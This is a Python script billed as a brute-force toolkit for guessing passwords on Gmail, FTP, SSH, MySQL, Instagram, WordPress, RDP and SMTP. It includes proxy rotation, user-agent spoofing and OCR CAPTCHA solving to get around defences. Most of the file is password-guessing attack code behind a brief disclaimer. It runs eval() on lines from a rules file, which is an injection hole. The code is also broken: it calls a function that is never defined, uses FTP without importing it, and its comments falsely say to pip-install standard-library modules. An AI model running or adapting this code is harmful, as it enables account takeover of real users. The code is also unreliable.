#!/usr/bin/env python3
# -*- coding: utf-8 -*-
### BEGIN INIT INFO
# Provides:          brute
# Required-Start:    $network $remote_fs
# Required-Stop:     $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Brute Force Toolkit
# Description:       A toolkit designed for ethical penetration testing and brute-force attacks on various services (SSH, FTP, SMTP, etc.).
# Author:
# + MIDØ <https://github.com/Midohajhouj>
# License:           MIT License - https://opensource.org/licenses/MIT
### END INIT INFO ###

import sys  # Required for system operations
import importlib  # Required for dynamic library imports

def check_library(lib_name):
    """Check if a library is installed and provide instructions to install it if not."""
    try:
        importlib.import_module(lib_name)
    except ImportError:
        print(f"{lib_name} is not installed.")
        print(f"Install it using: pip install {lib_name} --break-system-packages")
        sys.exit(1)

# ================== Third-Party Libraries ==================
# Check for required third-party libraries.
required_libraries = [
    "paramiko", "mysql.connector", "pytesseract", "Pillow", "bcrypt", 
    "socks", "tqdm", "requests"
]

for lib in required_libraries:
    # Handle libraries with potential naming differences like "Pillow" for "PIL".
    check_library(lib.split(".")[0])

# Libraries are now guaranteed to be installed. Import them.
import smtplib  # Install module with pip smtplib --break-system-packages
import threading  # Install module with pip threading --break-system-packages
import time  # Install module with pip time --break-system-packages
import random  # Install module with pip random --break-system-packages
import logging  # Install module with pip logging --break-system-packages
import signal  # Install module with pip signal --break-system-packages
import re  # Install module with pip re --break-system-packages
import sqlite3  # Install module with pip sqlite3 --break-system-packages
import requests  # Install module with pip requests --break-system-packages
import configparser  # Install module with pip configparser --break-system-packages
import paramiko  # Install module with pip paramiko --break-system-packages
import mysql.connector  # Install module with pip mysql-connector-python --break-system-packages
from optparse import OptionParser  # Install module with pip optparse --break-system-packages
from concurrent.futures import ThreadPoolExecutor, as_completed  # Install module with pip futures --break-system-packages
from os import path  # Install module with pip os --break-system-packages
from tqdm import tqdm  # Install module with pip tqdm --break-system-packages
import hashlib  # Install module with pip hashlib --break-system-packages
import json  # Install module with pip json --break-system-packages
import os  # Install module with pip os --break-system-packages
import string  # Install module with pip string --break-system-packages
import itertools  # Install module with pip itertools --break-system-packages
from datetime import datetime  # Install module with pip datetime --break-system-packages
import socket  # Install module with pip socket --break-system-packages
import pytesseract  # Install module with pip pytesseract --break-system-packages
from PIL import Image  # Install module with pip pillow --break-system-packages
import bcrypt  # Install module with pip bcrypt --break-system-packages
import socks  # Install module with pip PySocks --break-system-packages
import pickle  # Install module with pip pickle --break-system-packages
from logging.handlers import RotatingFileHandler  # Install module with pip logging --break-system-packages

# Logging configuration
logger = logging.getLogger('secure_logger')
handler = RotatingFileHandler('brute.log', maxBytes=1000000, backupCount=5)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# Color codes for terminal output
R = '\033[31m'  # red
G = '\033[32m'  # green
W = '\033[0m'   # white (normal)

# User-Agent list for rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
]

# Global variables
current_proxy = 0
proxy_list = []
config = configparser.ConfigParser()

# Signal handler for graceful exit
def signal_handler(sig, frame):
    print(f'\n{R}[!] Exiting gracefully...{W}')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Proxy rotation function
def rotate_proxy():
    global current_proxy
    if not proxy_list:
        logging.error("No proxies available in the list.")
        return
    current_proxy = (current_proxy + 1) % len(proxy_list)
    logging.info(f"Rotated to proxy: {proxy_list[current_proxy]}")

# Load proxies from file
def load_proxies(proxy_file):
    global proxy_list
    try:
        with open(proxy_file, 'r') as f:
            proxy_list = [line.strip() for line in f if line.strip()]
        logging.info(f"Loaded {len(proxy_list)} proxies.")
    except Exception as e:
        logging.error(f"Failed to load proxies: {e}")
        sys.exit(1)

# Password strength checker
def password_strength(password):
    strength = 0
    if len(password) >= 8:
        strength += 1
    if re.search(r"[A-Z]", password):
        strength += 1
    if re.search(r"[0-9]", password):
        strength += 1
    if re.search(r"[!@#$%^&*()]", password):
        strength += 1
    return strength

# Save results to database securely
def save_to_db(service, username, password):
    conn = sqlite3.connect('brute_results.db')
    cursor = conn.cursor()
    cursor.execute('CREATE TABLE IF NOT EXISTS results (service TEXT, username TEXT, password_hash TEXT)')
    password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
    cursor.execute('INSERT INTO results VALUES (?, ?, ?)', (service, username, password_hash))
    conn.commit()
    conn.close()

# Generate password list with custom rules
def generate_password_list(base_words, rules=None, min_length=4, max_length=12):
    passwords = set()
    chars = string.ascii_letters + string.digits + string.punctuation
    for word in base_words:
        if min_length <= len(word) <= max_length:
            passwords.add(word)
        for i in range(1, 4):
            for combo in itertools.product(chars, repeat=i):
                suffix = ''.join(combo)
                passwords.add(word + suffix)
                passwords.add(suffix + word)
    if rules:
        passwords = {apply_custom_rules(pwd, rules) for pwd in passwords}
    return list(passwords)

# Apply custom rules to passwords
def apply_custom_rules(password, rules):
    for rule in rules:
        password = rule(password)
    return password

# CAPTCHA handling using OCR
def solve_captcha(image_url):
    try:
        response = requests.get(image_url)
        with open("captcha.png", "wb") as f:
            f.write(response.content)
        captcha_text = pytesseract.image_to_string(Image.open("captcha.png"))
        return captcha_text
    except Exception as e:
        logging.error(f"CAPTCHA solving error: {e}")
        return None

# Gmail brute-force function
def gmail_brute(username, password_list):
    print(f"\n{R}[+] Gmail Account: {username}{W}")
    print(f"{R}<<<<<<+++++ Start Attacking Gmail +++++>>>>>{W}")
    for password in tqdm(password_list, desc="Brute-Forcing", unit="password"):
        password = password.strip()
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(username, password)
            print(f"\n{G}[+] Password Found: {password}{W}")
            save_to_db("Gmail", username, password)
            server.quit()
            break
        except smtplib.SMTPAuthenticationError:
            print(f"\n{R}[!] False Login Password: {password}{W}")
        except Exception as e:
            logging.error(f"Gmail brute error: {e}")

# FTP brute-force function
def ftp_brute(host, username, password_list):
    print(f"\n{R}[+] FTP Host: {host}{W}")
    print(f"{R}<<<<<<+++++ Start Attacking FTP +++++>>>>>{W}")
    for password in tqdm(password_list, desc="Brute-Forcing", unit="password"):
        password = password.strip()
        try:
            ftp = FTP(host)
            ftp.login(username, password)
            print(f"\n{G}[+] Password Found: {password}{W}")
            save_to_db("FTP", username, password)
            ftp.quit()
            break
        except:
            print(f"\n{R}[!] False Login Password: {password}{W}")

# Interactive mode
def interactive_mode():
    print(f"{G}[+] Interactive Mode{W}")
    service = input("Enter service (ssh/mysql/instagram/wordpress/rdp/smtp/gmail/ftp): ")
    target = input("Enter target (host/username/URL): ")
    username_list = input("Enter username list file (leave blank for single username): ")
    password_list = input("Enter password list file (leave blank for single password): ")
    proxy_file = input("Enter proxy list file (leave blank for no proxies): ")

    if username_list:
        with open(username_list, 'r') as f:
            username_list = f.readlines()
    else:
        username_list = [input("Enter username: ")]

    if password_list:
        with open(password_list, 'r') as f:
            password_list = f.readlines()
    else:
        password_list = [input("Enter password: ")]

    if proxy_file:
        load_proxies(proxy_file)

    threaded_dictionary_attack(service, target, username_list, password_list)

# Display legal disclaimer
def display_disclaimer():
    print(f"{R}[!] WARNING: This script is for educational purposes only.{W}")
    print(f"{R}[!] Use it responsibly and only on systems you own or have permission to test.{W}")
    print(f"{R}[!] Unauthorized access to systems is illegal and punishable by law.{W}")
    input("Press Enter to continue...")

# Main function
def main():
    # Legal disclaimer
    display_disclaimer()

    parser = OptionParser(usage=f"{G}%prog [options]{W}")
    parser.add_option("-s", "--ssh", dest="ssh", help="SSH host to brute-force")
    parser.add_option("-m", "--mysql", dest="mysql", help="MySQL host to brute-force")
    parser.add_option("-i", "--instagram", dest="instagram", help="Instagram account to brute-force")
    parser.add_option("-w", "--wordpress", dest="wordpress", help="WordPress site to brute-force")
    parser.add_option("-r", "--rdp", dest="rdp", help="RDP host to brute-force")
    parser.add_option("-S", "--smtp", dest="smtp", help="SMTP host to brute-force")
    parser.add_option("-g", "--gmail", dest="gmail", help="Gmail account to brute-force")
    parser.add_option("-f", "--ftp", dest="ftp", help="FTP host to brute-force")
    parser.add_option("-u", "--username", dest="username", help="Username for SSH/MySQL/RDP/SMTP/Gmail/FTP")
    parser.add_option("-U", "--userlist", dest="userlist", help="Username list file")
    parser.add_option("-P", "--pass", dest="passlist", help="Password list file")
    parser.add_option("-p", "--password", dest="password", help="Single password to try")
    parser.add_option("-X", "--proxy", dest="proxy", help="Proxy list file")
    parser.add_option("-R", "--rules", dest="rules", help="Custom password rules file")
    parser.add_option("-I", "--interactive", dest="interactive", action="store_true", help="Interactive mode")
    (options, args) = parser.parse_args()

    if options.interactive:
        interactive_mode()
        sys.exit(0)

    if not any([options.ssh, options.mysql, options.instagram, options.wordpress, options.rdp, options.smtp, options.gmail, options.ftp]):
        parser.print_help()
        sys.exit(1)

    if options.proxy:
        load_proxies(options.proxy)

    if options.passlist:
        with open(options.passlist, 'r') as f:
            password_list = f.readlines()
    elif options.password:
        password_list = [options.password]
    else:
        logging.error("No password list or single password provided.")
        sys.exit(1)

    if options.userlist:
        with open(options.userlist, 'r') as f:
            username_list = f.readlines()
    elif options.username:
        username_list = [options.username]
    else:
        logging.error("No username list or single username provided.")
        sys.exit(1)

    if options.rules:
        with open(options.rules, 'r') as f:
            rules = [eval(line.strip()) for line in f if line.strip()]
    else:
        rules = []

    if options.ssh:
        threaded_dictionary_attack("ssh", options.ssh, username_list, password_list)
    if options.mysql:
        threaded_dictionary_attack("mysql", options.mysql, username_list, password_list)
    if options.instagram:
        threaded_dictionary_attack("instagram", None, username_list, password_list)
    if options.wordpress:
        threaded_dictionary_attack("wordpress", options.wordpress, username_list, password_list)
    if options.rdp:
        threaded_dictionary_attack("rdp", options.rdp, username_list, password_list)
    if options.smtp:
        threaded_dictionary_attack("smtp", options.smtp, username_list, password_list)
    if options.gmail:
        threaded_dictionary_attack("gmail", None, username_list, password_list)
    if options.ftp:
        threaded_dictionary_attack("ftp", options.ftp, username_list, password_list)

if __name__ == "__main__":
    main()
